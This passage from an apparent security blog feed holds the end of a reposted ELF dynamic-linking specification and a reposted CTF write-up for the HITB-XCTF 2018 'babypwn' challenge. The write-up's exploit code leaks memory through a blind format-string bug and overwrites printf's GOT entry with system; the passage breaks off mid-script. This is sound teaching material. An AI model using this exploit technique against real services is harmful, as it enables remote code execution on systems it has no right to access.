<li>For security, the dynamic linker does not allow use of <code>$ORIGIN</code> substitution sequences for set-user and set-group ID programs. For such sequences that appear within strings specified by   <code>DT_RUNPATH</code> dynamic array entries, the specific search path containing the <code>$ORIGIN</code> sequence is ignored (though other search paths in the same string are processed). <code>$ORIGIN</code> sequences within a  <code>DT_NEEDED</code> entry or path passed as a parameter to  <code>dlopen()</code> are treated as errors. The same restrictions may be applied to processes that have more than minimal privileges on systems with installed extended security mechanisms.</li>
</ul>
<hr>
<ul>
<li><h3 id="Global-Offset-Table"><a href="#Global-Offset-Table" class="headerlink" title="Global Offset Table"></a>Global Offset Table</h3></li>
</ul>
<hr>
<ul>
<li>This section requires processor-specific information. The System V Application Binary Interface supplement for the desired processor describes the details.</li>
</ul>
<hr>
<ul>
<li><h3 id="Procedure-Linkage-Table"><a href="#Procedure-Linkage-Table" class="headerlink" title="Procedure Linkage Table"></a>Procedure Linkage Table</h3></li>
</ul>
<hr>
<ul>
<li>This section requires processor-specific information. The System V Application Binary Interface supplement for the desired processor describes the details.</li>
</ul>
<hr>
<ul>
<li><h3 id="Hash-Table"><a href="#Hash-Table" class="headerlink" title="Hash Table"></a>Hash Table</h3></li>
<li><p>A hash table of    <code>Elf32_Word</code> objects supports symbol table access. The same table layout is used for both the 32-bit and 64-bit file class. Labels appear below to help explain the hash table organization, but they are not part of the specification.</p>
</li>
</ul>
<hr>
<ul>
<li><p>Figure 5-12: Symbol Hash Table</p>
</li>
<li><p>| <code>nbucket</code>                         |<br>| --------------------------------- |<br>| <code>nchain</code>                          |<br>| <code>bucket[0]. . .bucket[nbucket-1]</code> |<br>| <code>chain[0]. . .chain[nchain-1]</code>    |</p>
</li>
</ul>
<hr>
<ul>
<li>The <code>bucket</code> array contains <code>nbucket</code> entries, and the <code>chain</code> array contains <code>nchain</code> entries; indexes start at 0. Both <code>bucket</code> and <code>chain</code> hold symbol table indexes. Chain table entries parallel the symbol table. The number of symbol table entries should equal <code>nchain</code>; so symbol table indexes also select chain table entries. A hashing function (shown below) accepts a symbol name and returns a value that may be used to compute a <code>bucket</code> index. Consequently, if the hashing function returns the value <em>x</em> for some name, <code>bucket[</code><em>x</em><code>%nbucket]</code> gives an index, <em>y</em>, into both the symbol table and the chain table. If the symbol table entry is not the one desired, <code>chain[</code><em>y</em><code>]</code> gives the next symbol table entry with the same hash value. One can follow the <code>chain</code> links until either the selected symbol table entry holds the desired name or the <code>chain</code>entry contains the value <code>STN_UNDEF</code>.</li>
</ul>
<hr>
<ul>
<li><p>Figure 5-13: Hashing Function</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">unsigned long</div><div class="line">elf_hash(const unsigned char *name)</div><div class="line">&#123;</div><div class="line">	unsigned long	h = 0, g;</div><div class="line">	while (*name)</div><div class="line">	&#123;</div><div class="line">		h = (h &lt;&lt; 4) + *name++;</div><div class="line">		if (g = h &amp; 0xf0000000)</div><div class="line">			h ^= g &gt;&gt; 24;</div><div class="line">		h &amp;= ~g;</div><div class="line">	&#125;</div><div class="line">	return h;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li><h3 id="Initialization-and-Termination-Functions"><a href="#Initialization-and-Termination-Functions" class="headerlink" title="Initialization and Termination Functions"></a>Initialization and Termination Functions</h3></li>
<li><p>After the dynamic linker has built the process image and performed the relocations, each shared object and the executable file get the opportunity to execute some initialization functions. All shared object initializations happen before the executable file gains control.</p>
</li>
<li><p>Before the initialization functions for any object A is called, the initialization functions for any other objects that object A depends on are called. For these purposes, an object A depends on another object B, if B appears in A&#39;s list of needed objects (recorded in the <code>DT_NEEDED</code> entries of the dynamic structure). The order of initialization for circular dependencies is undefined.</p>
</li>
<li><p>The initialization of objects occurs by recursing through the needed entries of each object. The initialization functions for an object are invoked after the needed entries for that object have been processed. The order of processing among the entries of a particular list of needed objects is unspecified.</p>
</li>
</ul>
<hr>
<ul>
<li>Each processor supplement may optionally further restrict the algorithm used to determine the order of initialization. Any such restriction, however, may not conflict with the rules described by this specification.</li>
</ul>
<hr>
<ul>
<li>The following example illustrates two of the possible correct orderings which can be generated for the example NEEDED lists. In this example the <em>a.out</em> is dependent on <code>b</code>, <code>d</code>, and <code>e</code>. <code>b</code> is dependent on <code>d</code> and <code>f</code>, while <code>d</code> is dependent on <code>e</code> and <code>g</code>. From this information a dependency graph can be drawn. The above algorithm on initialization will then allow the following specified initialization orderings among others.</li>
</ul>
<hr>
<ul>
<li><p>Figure 5-14: Initialization Ordering Example</p>
</li>
<li><p>​</p>
</li>
<li><p><img src="/images/2018-04-21/init_example.gif" alt="img"></p>
</li>
<li><p>​</p>
</li>
</ul>
<hr>
<ul>
<li><p>Similarly, shared objects and executable files may have termination functions, which are executed with the <code>atexit</code>(BA_OS) mechanism after the base process begins its termination sequence. The termination functions for any object A must be called before the termination functions for any other objects that object A depends on. For these purposes, an object A depends on another object B, if B appears in A&#39;s list of needed objects (recorded in the <code>DT_NEEDED</code> entries of the dynamic structure). The order of termination for circular dependencies is undefined.</p>
</li>
<li><p>Finally, an executable file may have pre-initialization functions. These functions are executed after the dynamic linker has built the process image and performed relocations but before any shared object initialization functions. Pre-initialization functions are not permitted in shared objects.</p>
</li>
</ul>
<hr>
<ul>
<li>Complete initialization of system libraries may not have occurred when pre-initializations are executed, so some features of the system may not be available to pre-initialization code. In general, use of pre-initialization code can be considered portable only if it has no dependencies on system libraries.</li>
</ul>
<hr>
<ul>
<li><p>The dynamic linker ensures that it will not execute any initialization, pre-initialization, or termination functions more than once.</p>
</li>
<li><p>Shared objects designate their initialization and termination code in one of two ways. First, they may specify the address of a function to execute via the <code>DT_INIT</code> and <code>DT_FINI</code> entries in the dynamic structure, described in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#dynamic_section" target="_blank" rel="external">&quot;Dynamic Section&#39;&#39;</a> above.</p>
</li>
</ul>
<hr>
<ul>
<li>Note that the address of a function need not be the same as a pointer to a function as defined by the processor supplement.</li>
</ul>
<hr>
<ul>
<li>Shared objects may also (or instead) specify the address and size of an array of function pointers. Each element of this array is a pointer to a function to be executed by the dynamic linker. Each array element is the size of a pointer in the programming model followed by the object containing the array. The address of the array of initialization function pointers is specified by the <code>DT_INIT_ARRAY</code> entry in the dynamic structure. Similarly, the address of the array of pre-initialization functions is specified by <code>DT_PREINIT_ARRAY</code>and the address of the array of termination functions is specified by <code>DT_FINI_ARRAY</code>. The size of each array is specified by the <code>DT_INIT_ARRAYSZ</code>, <code>DT_PREINIT_ARRAYSZ</code>, and <code>DT_FINI_ARRAYSZ</code> entries.</li>
</ul>
<hr>
<ul>
<li>The addresses contained in the initialization and termination arrays are function pointers as defined by the processor supplement for each processor. On some architectures, a function pointer may not contain the actual address of the function.</li>
</ul>
<hr>
<ul>
<li><p>The functions pointed to in the arrays specified by <code>DT_INIT_ARRAY</code> and by <code>DT_PREINIT_ARRAY</code> are executed by the dynamic linker in the same order in which their addresses appear in the array; those specified by <code>DT_FINI_ARRAY</code> are executed in reverse order.</p>
</li>
<li><p>If an object contains both <code>DT_INIT</code> and <code>DT_INIT_ARRAY</code> entries, the function referenced by the <code>DT_INIT</code> entry is processed before those referenced by the <code>DT_INIT_ARRAY</code> entry for that object. If an object contains both <code>DT_FINI</code> and <code>DT_FINI_ARRAY</code> entries, the functions referenced by the <code>DT_FINI_ARRAY</code> entry are processed before the one referenced by the <code>DT_FINI</code> entry for that object.</p>
</li>
</ul>
<hr>
<ul>
<li>Although the atexit(BA_OS) termination processing normally will be done, it is not guaranteed to have executed upon process death. In particular, the process will not execute the termination processing if it calls <code>_exit</code>[see exit(BA_OS)] or if the process dies because it received a signal that it neither caught nor ignored.</li>
</ul>
<hr>
<ul>
<li>The processor supplement for each processor specifies whether the dynamic linker is responsible for calling the executable file&#39;s initialization function or registering the executable file&#39;s termination function with <code>atexit</code>(BA_OS). Termination functions specified by users via the <code>atexit</code>(BA_OS) mechanism must be executed before any termination functions of shared objects.</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;本文参考&quot;&gt;&lt;a href=&quot;#本文参考&quot; class=&quot;headerlink&quot; title=&quot;本文参考&quot;&gt;&lt;/a&gt;本文参考&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://www.sco.com/developers/gabi/latest/ch5.dynamic
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="编译" scheme="http://yoursite.com/tags/%E7%BC%96%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>blind attack:HITB-XCTF Quals 2018 - babypwn</title>
    <link href="http://yoursite.com/2018/04/20/blind-attack-HITB-XCTF-Quals-2018-babypwn/"/>
    <id>http://yoursite.com/2018/04/20/blind-attack-HITB-XCTF-Quals-2018-babypwn/</id>
    <published>2018-04-20T14:17:22.000Z</published>
    <updated>2018-04-20T14:25:26.177Z</updated>
    
    <content type="html"><![CDATA[<p>From <a href="https://fbesnard.com/2018/04/13/HITB-XCTF-Quals-2018-babypwn/" target="_blank" rel="external">https://fbesnard.com/2018/04/13/HITB-XCTF-Quals-2018-babypwn/</a></p>
<h2 id="Challenge-description"><a href="#Challenge-description" class="headerlink" title="Challenge description"></a>Challenge description</h2><p>nc 47.75.182.113 9999</p>
<h2 id="Challenge-resolution"><a href="#Challenge-resolution" class="headerlink" title="Challenge resolution"></a>Challenge resolution</h2><h3 id="Introducing-ourselves"><a href="#Introducing-ourselves" class="headerlink" title="Introducing ourselves"></a>Introducing ourselves</h3><p>Using netcat to connect to the challenge, we are greeted with the following message :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">florent@kali:~# nc 47.75.182.113 9999</div><div class="line">&lt;NOTHING...&gt;</div></pre></td></tr></table></figure>
<p>Very talkative server, I appreciate that…<br>Maybe we should introduce ourselves :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">florent@kali:~# nc 47.75.182.113 9999</div><div class="line">Hello, I&apos;m Florent             # My input</div><div class="line">Hello, I&apos;m Florent             # Server&apos;s reply</div></pre></td></tr></table></figure>
<p>So, it seems that the server is sending our input back to us (or is called Florent as well, which is likely not the case…).<br>At this point, one of the possible vulnerabilities that comes to our mind is a format string vulnerability :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">florent@kali:~# nc 47.75.182.113 9999</div><div class="line">Hello, I&apos;m Florent</div><div class="line">Hello, I&apos;m Florent</div><div class="line">%p %p %p %p %p                                                     # My input</div><div class="line">(nil) (nil) 0x7f2a89d352f0 0x7f2a8a02f780 0x7f2a8a256700           # Server&apos;s reply</div></pre></td></tr></table></figure>
<p>By sending <code>%p</code> to the server, it replies to us with an address to which a pointer refers.<br>Unfortunately for us, we don’t have access to the binary or its source code.<br>But here we are : a blind format string vulnerability !</p>
<h3 id="Further-knowing-the-server-or-getting-our-hands-dirty"><a href="#Further-knowing-the-server-or-getting-our-hands-dirty" class="headerlink" title="Further knowing the server (or getting our hands dirty)"></a>Further knowing the server (or getting our hands dirty)</h3><p>Now it’s time to find a way to grab the flag.<br>I’ve already played with format strings vulnerabilities but never blindly.<br>While looking on the net for information on how I could efficiently leak usable addresses from the binary, I came across a challenge from the 33c3 CTF entitled <code>Eat, Sleep Pwn, Repeat</code> or <code>ESPR</code> (which is also the name of the German team which organized the 33c3 CTF).<br>The situation is pretty much the same and I started looking at write-ups of the challenge.<br>I stumbled across these 2 excellent ressources that I encourage you to take a look at :</p>
<ul>
<li><a href="https://github.com/InfoSecIITR/write-ups/blob/master/2016/33c3-ctf-2016/pwn/espr/README.md" target="_blank" rel="external">Write-up from @jay_f0xtr0t:</a></li>
<li><a href="https://youtu.be/XuzuFUGuQv0" target="_blank" rel="external">Video from @LiveOverflow:</a></li>
</ul>
<p>In order to solve the challenge, I used the script from <a href="https://twitter.com/jay_f0xtr0t" target="_blank" rel="external">@jay_f0xtr0t</a> (<a href="https://github.com/InfoSecIITR/write-ups/blob/master/2016/33c3-ctf-2016/pwn/espr/espr.py" target="_blank" rel="external">available here</a>) that I adapted a little bit.</p>
<p>Below is the explanation of what the different parts of the code do :</p>
<p>First, we connect to the challenge (obviously) and set the architecture accordingly.<br>The challenge is a 64-bit binary : our <code>%p</code> inputs reveal addresses like <code>0x7f2a8a02f780</code> which start with <code>0x7f</code> and are 6 bytes long.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">conn = remote(<span class="string">'47.75.182.113'</span>, <span class="number">9999</span>)</div><div class="line">context.update(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</div></pre></td></tr></table></figure>
<p>The <code>exec_payload</code> function is the function that exploits the format string vulnerability strictly speaking.<br>We prepend an arbitrary value (<code>_EOF</code> in this case but it could have been something else…) to our payload and the function will parse the server’s response until it reaches our value.<br>We ignore <code>\n</code> because if the server is using the <code>gets</code> function (or similar) for reading our input, the fact that there is a newline character will cause a weird behaviour : the function will replace <code>\n</code> with <code>\x00</code> (null byte) and we will get the output twice.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_payload</span><span class="params">(payload)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'\n'</span> <span class="keyword">in</span> payload:</div><div class="line">        <span class="keyword">return</span> <span class="string">""</span></div><div class="line">    conn.sendline(<span class="string">"_EOF"</span> + payload)</div><div class="line">    conn.recvuntil(<span class="string">"_EOF"</span>)</div><div class="line">    data = conn.recv()</div><div class="line">    <span class="keyword">return</span> data</div></pre></td></tr></table></figure>
<p>The <code>find_elf</code> function attempts to find an address that might be in the ELF binary.<br>To do so, it looks for an address starting with <code>0x400</code> (because <code>0x400000</code> is the default base address for binaries).<br>The address that we find will be useful later when we will use the <code>DynELF</code> function from PwnTools.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_elf</span><span class="params">(depth)</span>:</span></div><div class="line">    log.info(<span class="string">'Finding ELF. This might take a few seconds...'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, depth + <span class="number">1</span>):</div><div class="line">        data = exec_payload(<span class="string">'%'</span> + str(i) + <span class="string">'$p'</span>)</div><div class="line">        <span class="keyword">if</span> (len(data) == <span class="number">8</span> <span class="keyword">and</span> data[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">'0x400'</span>):</div><div class="line">			log.success(<span class="string">'FOUND ELF !'</span>)</div><div class="line">			<span class="keyword">return</span> int(data, <span class="number">16</span>)</div></pre></td></tr></table></figure>
<p>The <code>find_leak_point</code> function attempts to find the correct offset so that our input refers to itself and is sent back to us.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_leak_point</span><span class="params">()</span>:</span></div><div class="line">    log.info(<span class="string">'Finding leak point'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">200</span>):</div><div class="line">        r = exec_payload(<span class="string">'%'</span> + str(i) + <span class="string">'$p'</span> + <span class="string">'AAAAAAAA'</span> + <span class="string">'BBBBBBBB'</span>)</div><div class="line">        <span class="keyword">if</span> <span class="string">'0x4242424242424242'</span> <span class="keyword">in</span> r: <span class="comment"># chr(0x42) = 'B'</span></div><div class="line">            <span class="keyword">return</span> i</div></pre></td></tr></table></figure>
<p>The <code>leak</code> function leaks data from the address given as argument.<br>Some workarounds were made by the initial creator to handle the case of the special <code>\n</code> that we previously mentionned.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></div><div class="line">    addr &amp;= (<span class="number">2</span>**<span class="number">64</span> - <span class="number">1</span>)</div><div class="line">    r = exec_payload(<span class="string">'%'</span> + str(leak_point) + <span class="string">'$s'</span> + <span class="string">'XXXXXXXX'</span> + p64(addr))</div><div class="line">    <span class="keyword">if</span> r == <span class="string">''</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span></div><div class="line">    r = r[:r.index(<span class="string">'XXXXXXXX'</span>)]</div><div class="line">    <span class="keyword">if</span> r == <span class="string">'(null)'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> r + <span class="string">'\x00'</span></div></pre></td></tr></table></figure>
<p>Now using <a href="http://docs.pwntools.com/en/stable/dynelf.html" target="_blank" rel="external"><code>DynELF</code></a> from PwnTools, we can find the addresses of the <code>printf</code> and <code>system</code>functions.<br>The idea behind this is to overwrite the <code>printf</code> address from the Global Offset Table (GOT) with the one from <code>system</code>.<br>By doing so, when the server will attempt to reply to our request, it will use the <code>system</code> function instead of the <code>printf</code> function and thus execute the payload we send.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">d = DynELF(leak, start_address_elf)</div><div class="line">dynamic_addr = d.dynamic</div><div class="line">printf_addr = d.lookup(<span class="string">'printf'</span>, <span class="string">'libc'</span>)</div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</div></pre></td></tr></table></figure>
<p>The <code>find_plt_got</code> function attempts to find the address of the GOT inside the Procedure Linkage Table (PLT).<br>Indeed, the addresses for the <code>printf</code> and <code>system</code> functions we found before are in reality jumps to other addresses.<br>So if we find the GOT, we will be able to have the real address of the <code>printf</code>function from the GOT.<br>If you don’t get this point, you may want to take a look at <a href="https://www.youtube.com/watch?v=kUk5pw4w0h4" target="_blank" rel="external">this video</a> from <a href="https://twitter.com/liveoverflow" target="_blank" rel="external">@LiveOverflow</a>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_plt_got</span><span class="params">()</span>:</span></div><div class="line">    addr = dynamic_addr</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        x = d.leak.n(addr, <span class="number">2</span>)</div><div class="line">        <span class="keyword">if</span> x == <span class="string">'\x03\x00'</span>: <span class="comment"># PLT/GOT</span></div><div class="line">            addr += <span class="number">8</span></div><div class="line">            <span class="keyword">return</span> u64(d.leak.n(addr, <span class="number">8</span>))</div><div class="line">        addr += <span class="number">0x10</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_printf</span><span class="params">()</span>:</span></div><div class="line">    addr = got_addr</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        x = d.leak.n(addr, <span class="number">8</span>)</div><div class="line">        <span class="keyword">if</span> x == p64(printf_addr):</div><div class="line">            <span class="keyword">return</span> addr</div><div class="line">        addr += <span class="number">8</span></div></pre></td></tr></table></figure>
<p>The <code>forge_exploit</code> function generates the final payload to be send to the server, replacing the value at the given address by the one we choose.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">forge_exploit</span><span class="params">(addr, val)</span>:</span></div><div class="line">    ret = <span class="string">''</span></div><div class="line">    curout = <span class="number">4</span></div><div class="line">    dist_to_addr = <span class="number">12</span> + <span class="number">8</span>*<span class="number">20</span></div><div class="line">    reader = (dist_to_addr / <span class="number">8</span>) + <span class="number">7</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        diff = (val &amp; <span class="number">0xff</span>) - curout</div><div class="line">        curout = (val &amp; <span class="number">0xff</span>)</div><div class="line">        val /= <span class="number">0x100</span></div><div class="line">        <span class="keyword">if</span> diff &lt; <span class="number">20</span>:</div><div class="line">            diff += <span class="number">0x100</span></div><div class="line">        ret += <span class="string">'%0'</span> + str(diff) + <span class="string">'u'</span></div><div class="line">        ret += <span class="string">'%'</span> + str(reader) + <span class="string">'$hhn'</span></div><div class="line">        reader += <span class="number">1</span></div><div class="line">    ret += <span class="string">'A'</span>*(dist_to_addr - len(ret))</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        ret += p64(addr + i)</div><div class="line">    <span class="keyword">return</span> ret</div></pre></td></tr></table></figure>
<p>Below is the full exploit code :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">conn = remote(<span class="string">'47.75.182.113'</span>, <span class="number">9999</span>)</div><div class="line">context.update(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</div><div class="line"></div><div class="line">DEPTH = <span class="number">100</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_payload</span><span class="params">(payload)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'\n'</span> <span class="keyword">in</span> payload:</div><div class="line">        <span class="keyword">return</span> <span class="string">""</span></div><div class="line">    conn.sendline(<span class="string">"_EOF"</span> + payload)</div><div class="line">    conn.recvuntil(<span class="string">"_EOF"</span>)</div><div class="line">    data = conn.recv()</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_elf</span><span class="params">(depth)</span>:</span></div><div class="line">    log.info(<span class="string">'Finding ELF. This might take a few seconds...'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, depth + <span class="number">1</span>):</div><div class="line">        data = exec_payload(<span class="string">'%'</span> + str(i) + <span class="string">'$p'</span>)</div><div class="line">        <span class="keyword">if</span> (len(data) == <span class="number">8</span> <span class="keyword">and</span> data[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">'0x400'</span>):</div><div class="line">			log.success(<span class="string">'FOUND ELF !'</span>)</div><div class="line">			<span class="keyword">return</span> int(data, <span class="number">16</span>)</div><div class="line"></div><div class="line">start_address_elf = find_elf(DEPTH)</div><div class="line">log.info(<span class="string">'Using address %s'</span> % hex(start_address_elf))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_leak_point</span><span class="params">()</span>:</span></div><div class="line">    log.info(<span class="string">'Finding leak point'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">200</span>):</div><div class="line">        r = exec_payload(<span class="string">'%'</span> + str(i) + <span class="string">'$p'</span> + <span class="string">'AAAAAAAA'</span> + <span class="string">'BBBBBBBB'</span>)</div><div class="line">        <span class="keyword">if</span> <span class="string">'0x4242424242424242'</span> <span class="keyword">in</span> r: <span class="comment"># chr(0x42) = 'B'</span></div><div class="line">            <span class="keyword">return</span> i</div><div class="line"></div><div class="line">leak_point = find_leak_point()</div><div class="line">log.success(<span class="string">'FOUND leak point %d'</span> % leak_point)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></div><div class="line">    addr &amp;= (<span class="number">2</span>**<span class="number">64</span> - <span class="number">1</span>)</div><div class="line">    r = exec_payload(<span class="string">'%'</span> + str(leak_point) + <span class="string">'$s'</span> + <span class="string">'XXXXXXXX'</span> + p64(addr))</div><div class="line">    <span class="keyword">if</span> r == <span class="string">''</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span></div><div class="line">    r = r[:r.index(<span class="string">'XXXXXXXX'</span>)]</div><div class="line">    <span class="keyword">if</span> r == <span class="string">'(null)'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> r + <span class="string">'\x00'</span></div><div class="line"></div><div class="line">d = DynELF(leak, start_address_elf)</div><div class="line">dynamic_addr = d.dynamic</div><div class="line">printf_addr = d.lookup(<span class="string">'printf'</span>, <span class="string">'libc'</span>)</div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_plt_got</span><span class="params">()</span>:</span></div><div class="line">    addr = dynamic_addr</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        x = d.leak.n(addr, <span class="number">2</span>)</div><div class="line">        <span class="keyword">if</span> x == <span class="string">'\x03\x00'</span>: <span class="comment"># type PLTGOT</span></div><div class="line">            addr += <span class="number">8</span></div><div class="line">            <span class="keyword">return</span> u64(d.leak.n(addr, <span class="number">8</span>))</div><div class="line">        addr += <span class="number">0x10</span></div><div class="line"></div><div class="line">got_addr = find_plt_got()</div><div class="line">log.success(<span class="string">'FOUND GOT Address: %s'</span> % hex(got_addr))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_printf</span><span class="params">()</span>:</span></div><div class="line">    addr = got_addr</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        x = d.leak.n(addr, <span class="number">8</span>)</div><div class="line">        <span class="keyword">if</span> x == p64(printf_addr):</div><div class="line">            <span class="keyword">return</span> addr</div><div class="line">        addr += <span class="number">8</span></div><div class="line"></div><div class="line">printf_got = find_printf()</div><div class="line">log.success(<span class="string">'FOUND printf@GOT : %s'</span> % hex(printf_got))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">forge_exploit</span><span class="params">(addr, val)</span>:</span></div><div class="line">    ret = <span class="string">''</span></div><div class="line">    curout = <span class="number">4</span></div><div class="line">    dist_to_addr = <span class="number">12</span> + <span class="number">8</span>*<span 